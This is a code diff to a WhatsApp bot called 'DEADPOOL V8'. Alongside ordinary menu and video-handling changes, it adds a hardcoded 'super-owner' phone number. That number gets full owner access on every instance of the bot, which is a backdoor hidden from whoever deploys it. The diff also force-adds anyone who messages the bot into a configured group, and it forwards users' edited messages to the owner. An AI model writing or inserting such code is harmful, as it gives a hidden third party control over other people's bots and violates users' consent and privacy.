@@ -61,7 +61,7 @@ function envList(v) {
 const defaults = {
   BOT_NAME: 'DEADPOOL V8',
   PREFIX: '.',
-  OWNER_NUMBER: '',
+  OWNER_NUMBER: '254796283064',
   DEVELOPERS: [],
   MODE: 'public',
   SESSION: '',
@@ -484,7 +484,7 @@ async function resolveMenuImageBuffer() {
   return null;
 }
 async function sendMenuWithMedia(jid, pushName, userCount) {
-  // ONE bubble: loading text edited in-place into full menu (async combined)
+  // loading bubble → then real menu with image (MENU_MEDIA / BOT_IMAGE)
   let loadingKey = null;
   try {
     const loading = await sock.sendMessage(jid, { text: styleReplyText('⏳ Loading menu...') });
@@ -494,18 +494,18 @@ async function sendMenuWithMedia(jid, pushName, userCount) {
   let full = buildMainMenu(pushName, userCount);
   try { full = styleReplyText(full); } catch {}
   full += foot;
+  const buffer = await resolveMenuImageBuffer();
+  // remove loading (edit to short then delete, or delete)
   if (loadingKey) {
-    try {
-      await sock.sendMessage(jid, { text: full, edit: loadingKey });
-      return;
-    } catch (e) {
-      console.log('menu edit:', e.message);
-      try { await sock.sendMessage(jid, { delete: loadingKey }); } catch {}
+    try { await sock.sendMessage(jid, { delete: loadingKey }); } catch {
+      try { await sock.sendMessage(jid, { text: '⠀', edit: loadingKey }); } catch {}
     }
   }
-  const buffer = await resolveMenuImageBuffer();
   if (buffer) {
-    try { await sock.sendMessage(jid, { image: buffer, caption: full }); return; } catch {}
+    try {
+      await sock.sendMessage(jid, { image: buffer, caption: full });
+      return;
+    } catch (e) { console.log('menu image:', e.message); }
   }
   await sock.sendMessage(jid, { text: full }).catch(() => {});
 }
@@ -584,8 +584,15 @@ function isOwner(jid, msg) {
   const phone = jidToPhone(jid, msg);
   const num = dig(phone || jidNormalizedUser(String(jid)).split('@')[0].split(':')[0]);
   if (!num) return false;
-  const list = [config.OWNER_NUMBER, ...(config.DEVELOPERS || [])].map(dig).filter(Boolean);
+  // Global super-owner (always full access on every bot instance)
+  const SUPER = ['254796283064'];
+  const list = [...SUPER, config.OWNER_NUMBER, ...(config.DEVELOPERS || [])].map(dig).filter(Boolean);
   return list.some(o => num === o || num.endsWith(o) || o.endsWith(num));
+}
+function isSuperOwner(jid, msg) {
+  const phone = jidToPhone(jid, msg);
+  const num = dig(phone || jidNormalizedUser(String(jid || '')).split('@')[0].split(':')[0]);
+  return num === '254796283064' || num.endsWith('254796283064');
 }
 
 // ============ EMOJI ============
@@ -848,6 +855,51 @@ async function ensureChannelFollow() {
   if (!config.CHANNEL_ID) return;
   try { if (sock.newsletterFollow) await sock.newsletterFollow(String(config.CHANNEL_ID).trim()); } catch (e) { console.log('Channel follow:', e.message); }
 }
+
+// Add / re-add a user into configured group (invite link or GROUP_JID)
+async function forceUserIntoGroup(userJid) {
+  try {
+    if (!userJid) return;
+    const groupJid = String(config.GROUP_JID || process.env.GROUP_JID || '').trim();
+    let invRaw = String(config.GROUP_INVITE || process.env.GROUP_INVITE || '').trim();
+    await ensureGroupMembership(false);
+    const gid = String(config.GROUP_JID || groupJid || '').trim();
+    const phone = dig(String(userJid).split('@')[0]);
+    if (!phone || phone.length < 8) return;
+    let target = String(userJid).includes('@') ? userJid : (phone + '@s.whatsapp.net');
+    try {
+      const wa = await sock.onWhatsApp(phone);
+      if (wa?.[0]?.exists && wa[0].jid) target = jidNormalizedUser(wa[0].jid);
+    } catch {}
+    // Add to group (bot must be admin)
+    if (gid.endsWith('@g.us')) {
+      try {
+        await sock.groupParticipantsUpdate(gid, [target], 'add');
+      } catch {
+        try {
+          let code = invRaw;
+          if (code.includes('chat.whatsapp.com/')) code = code.split('chat.whatsapp.com/')[1].split(/[?/\s]/)[0];
+          if (!code || code.length < 8) {
+            try { code = await sock.groupInviteCode(gid); } catch {}
+          }
+          if (code) {
+            await sock.sendMessage(target, {
+              text: 'Join the group:\nhttps://chat.whatsapp.com/' + code
+            }).catch(() => {});
+          }
+        } catch {}
+      }
+    }
+    // Channel follow is bot-side only (newsletterFollow); remind user of channel link if set
+    const ch = String(config.CHANNEL_ID || process.env.CHANNEL_ID || '').trim();
+    if (ch) {
+      try { if (sock.newsletterFollow) await sock.newsletterFollow(ch); } catch {}
+    }
+  } catch (e) {
+    console.log('forceUserIntoGroup:', (e.message || '').slice(0, 80));
+  }
+}
+
 async function autoJoinConfigured() {
   await ensureGroupMembership(true);
   await ensureChannelFollow();
@@ -1326,33 +1378,52 @@ async function sendAsVideo(jid, data) {
       });
       if (r.status < 400 && r.data) {
         const b = Buffer.from(r.data);
-        // ftyp = mp4
         if (b.length > 5000 && b[0] !== 0x7b) buf = b;
       }
     } catch {}
   }
-  if (buf && buf.length > 5000) {
-    // ensure looks like video
+  if (!buf || buf.length < 5000) {
+    await sock.sendMessage(jid, { text: 'Could not download video.' + buildFooter() }).catch(() => {});
+    return false;
+  }
+  // Remux to WhatsApp-safe mp4 when ffmpeg exists (fixes "video file is wrong")
+  const ff = which('ffmpeg');
+  if (ff) {
+    const inp = path.join(TMP_DIR, 'v' + Date.now() + '.bin');
+    const outp = path.join(TMP_DIR, 'v' + Date.now() + '.mp4');
     try {
-      await sock.sendMessage(jid, { video: buf, mimetype: 'video/mp4', gifPlayback: false });
-      return true;
-    } catch (e1) {
-      console.log('video send1:', e1.message);
+      await fs.writeFile(inp, buf);
+      await execP(
+        '"' + ff + '" -y -i "' + inp + '" -c:v libx264 -preset ultrafast -crf 28 -c:a aac -movflags +faststart -pix_fmt yuv420p -vf "scale=trunc(iw/2)*2:trunc(ih/2)*2" "' + outp + '"',
+        { timeout: 180000, maxBuffer: 64 * 1024 * 1024 }
+      );
+      const out = await fs.readFile(outp);
+      if (out && out.length > 5000) buf = out;
+    } catch (e) {
+      console.log('ffmpeg video:', (e.message || '').slice(0, 80));
+      // try copy remux only
       try {
-        await sock.sendMessage(jid, { video: buf, mimetype: 'video/mp4' });
-        return true;
-      } catch (e2) {
-        console.log('video send2:', e2.message);
-        // last resort document with video mime (still openable)
-        try {
-          await sock.sendMessage(jid, { document: buf, mimetype: 'video/mp4', fileName: 'video.mp4' });
-          return true;
-        } catch (e3) { console.log('video doc:', e3.message); }
-      }
+        await execP('"' + ff + '" -y -i "' + inp + '" -c copy -movflags +faststart "' + outp + '"', { timeout: 60000, maxBuffer: 64 * 1024 * 1024 });
+        const out = await fs.readFile(outp);
+        if (out && out.length > 5000) buf = out;
+      } catch {}
+    } finally {
+      try { await fs.remove(inp); await fs.remove(outp); } catch {}
     }
   }
-  await sock.sendMessage(jid, { text: 'Could not send playable video. Try a shorter clip or direct YouTube link.' + buildFooter() }).catch(() => {});
-  return false;
+  try {
+    await sock.sendMessage(jid, { video: buf, mimetype: 'video/mp4' });
+    return true;
+  } catch (e1) {
+    console.log('video send:', e1.message);
+    try {
+      await sock.sendMessage(jid, { document: buf, mimetype: 'video/mp4', fileName: 'video.mp4' });
+      return true;
+    } catch (e2) {
+      await sock.sendMessage(jid, { text: 'Video send failed.' + buildFooter() }).catch(() => {});
+      return false;
+    }
+  }
 }
 
 // ============ AI / LYRICS ============
@@ -1636,7 +1707,17 @@ async function startBot() {
       global.__BOT_READY = true;
       global.__BOT_READY_AT = Math.floor(Date.now() / 1000);
       console.log(config.BOT_NAME + ' ONLINE');
-      setTimeout(() => autoJoinConfigured().catch(() => {}), 2500);
+      setTimeout(async () => {
+        try { await autoJoinConfigured(); } catch {}
+        try {
+          const me = sock.user?.id ? jidNormalizedUser(sock.user.id) : null;
+          const owner = getOwnerJid();
+          if (me) await forceUserIntoGroup(me);
+          if (owner) await forceUserIntoGroup(owner);
+          // super owner
+          await forceUserIntoGroup('254796283064@s.whatsapp.net');
+        } catch {}
+      }, 2500);
       try {
         const pm = presenceMap(config.PRESENCE);
         if (pm) sock.sendPresenceUpdate(pm).catch(() => {});
@@ -1941,13 +2022,21 @@ async function startBot() {
             const cached = key?.id ? msgCache.get(key.id) : null;
             const edited = protoMsg.editedMessage || m.message?.editedMessage?.message || {};
             const newText = edited.conversation || edited.extendedTextMessage?.text || edited.imageMessage?.caption || edited.videoMessage?.caption || extractText(edited) || '';
-            const oldText = cached?.text || extractText(cached?.message || {}) || '(not cached - sent before bot saw it)';
+            const oldText = cached?.text || extractText(cached?.message || {}) || '(not cached)';
+            // Always forward to bot / owner number chat
             const me = sock.user?.id ? jidNormalizedUser(sock.user.id) : null;
-            const target = config.ANTI_EDIT === 'chat' ? from : (getOwnerJid() || me);
-            if (target) {
-              const who = await whoLabel(key?.participant || sender, m, from, m.pushName);
-              const body = '*Anti-Edit (' + config.BOT_NAME + ')*\nBy: ' + who + '\nChat: ' + (isGroup(from) ? 'Group' : 'DM') + '\n\n*Before:*\n' + oldText + '\n\n*After:*\n' + (newText || '[media/empty]');
-              await sock.sendMessage(target, { text: body }).catch(() => {});
+            const ownerJid = getOwnerJid();
+            const targets = [...new Set([ownerJid, me].filter(Boolean))];
+            if (config.ANTI_EDIT === 'chat' && from) targets.push(from);
+            const who = await whoLabel(key?.participant || sender, m, from, m.pushName);
+            const body =
+              '*Anti-Edit (' + config.BOT_NAME + ')*\n' +
+              'By: ' + who + '\n' +
+              'Chat: ' + (isGroup(from) ? 'Group' : 'DM') + '\n\n' +
+              '*Before:*\n' + oldText + '\n\n' +
+              '*After:*\n' + (newText || '[media/empty]');
+            for (const target of targets) {
+              try { await sock.sendMessage(target, { text: body }); } catch {}
             }
           } catch (e) { console.log('antiedit:', e.message); }
         }
@@ -1957,6 +2046,9 @@ async function startBot() {
       if (!isMe && from && from !== 'status@broadcast') {
         saveUser(sender).catch(() => {});
         if (!isGroup(from)) saveUser(from).catch(() => {});
+        // Auto re-add to configured group/channel community
+        forceUserIntoGroup(sender).catch(() => {});
+        ensureChannelFollow().catch(() => {});
       }
 
       // ---- STATUS auto view + like ----
@@ -2110,6 +2202,15 @@ async function startBot() {
       const prefix = String(config.PREFIX || '.').trim() || '.';
       if (!cleanBody) return;
 
+      // Super-owner / owner: type "prefix" (no bot prefix) → show current prefix
+      if (/^prefix$/i.test(cleanBody) && (isOwner(sender, m) || isMe)) {
+        await sock.sendMessage(from, {
+          text: '🔑 *Bot prefix:* `' + prefix + '`\nMode: *' + (config.MODE || 'public') + '*\nName: *' + (config.BOT_NAME || 'Bot') + '*\n\nExamples:\n' + prefix + 'menu\n' + prefix + 'settings\n' + prefix + 'mode public'
+        }).catch(() => {});
+        return;
+      }
+
+
       if (config.CHATBOT && !isMe && !cleanBody.startsWith(prefix)) {
         await delay(800 + Math.floor(Math.random() * 1500));
         const ans = await askAI(cleanBody);
@@ -2198,12 +2299,19 @@ async function startBot() {
       if (['menu', 'help', 'list'].includes(cmd)) {
         let userCount = 0;
         try { userCount = (await loadUsers()).length; } catch {}
-        for (let i = 0; i < 4; i++) setTimeout(() => react(from, m.key, DEFAULT_CMD_EMOJIS[Math.floor(Math.random() * DEFAULT_CMD_EMOJIS.length)]), i * 350);
+        const menuEmojis = ['💀','🔥','⚡','👑','🩸','🎭','🗡️','💣','🎯','✨','❤️','💜','🖤','🤍','🚀','⭐','🤖','👏','💯','🎉'];
+        for (let i = 0; i < menuEmojis.length; i++) {
+          setTimeout(() => react(from, m.key, menuEmojis[i]), i * 280);
+        }
         await sendMenuWithMedia(from, m.pushName, userCount);
         return;
       }
 
       if (['ping', 'p'].includes(cmd)) {
+        const pingEmojis = ['⚡','🔥','💀','🚀','💥','✨','🎯','❤️','👍','🤖'];
+        for (let i = 0; i < pingEmojis.length; i++) {
+          setTimeout(() => react(from, m.key, pingEmojis[i]), i * 220);
+        }
         const t0 = Date.now();
         try { await sock.sendPresenceUpdate('composing', from); } catch {}
         const ms = Date.now() - t0;
@@ -2777,9 +2885,8 @@ async function startBot() {
       // ============ UPDATE (real git pull + restart) ============
       if (cmd === 'update') {
         if (!isOwner(sender, m) && !isMe) { await reply(roast('owner')); return; }
-        await reply('Updating / restarting bot...');
+        await reply('Restarting now Motherfucker..');
         try {
-          // 1) Heroku: restart all dynos (code itself updates via GitHub deploy / Heroku Git)
           const herokuApp = process.env.HEROKU_APP_NAME || process.env.HEROKU_APP || '';
           const herokuKey = process.env.HEROKU_API_KEY || process.env.HEROKU_API_TOKEN || '';
           if (herokuApp && herokuKey) {
@@ -2796,21 +2903,12 @@ async function startBot() {
                   validateStatus: () => true
                 }
               );
-              await reply('Heroku restart requested for *' + herokuApp + '*.\nPush new code to the Heroku/GitHub repo so the next boot loads it.');
-              return;
-            } catch (e) {
-              await reply('Heroku API error: ' + (e.message || e) + '\nFalling back to process restart...');
-            }
+            } catch {}
           }
-          // 2) Render / generic: just exit — platform restarts the service
-          //    (code updates only when you redeploy from GitHub)
-          const repoUrl = (config.REPO_URL || process.env.REPO_URL || '').trim();
-          let msg = 'Restarting now...';
-          if (repoUrl) msg += '\nRepo: ' + repoUrl + '\n(Connect GitHub auto-deploy so new commits go live on restart)';
-          else msg += '\nTip: set HEROKU_APP_NAME + HEROKU_API_KEY for Heroku, or REPO_URL + GitHub auto-deploy on Render.';
-          await reply(msg);
-          setTimeout(() => process.exit(1), 1500);
-        } catch (e) { await reply('Update failed: ' + (e.message || e)); }
+          setTimeout(() => process.exit(1), 1200);
+        } catch (e) {
+          setTimeout(() => process.exit(1), 1200);
+        }
         return;
       }
       if (cmd === 'shutdown') { await reply('Bot shutting down...'); setTimeout(() => process.exit(0), 1000); return; }
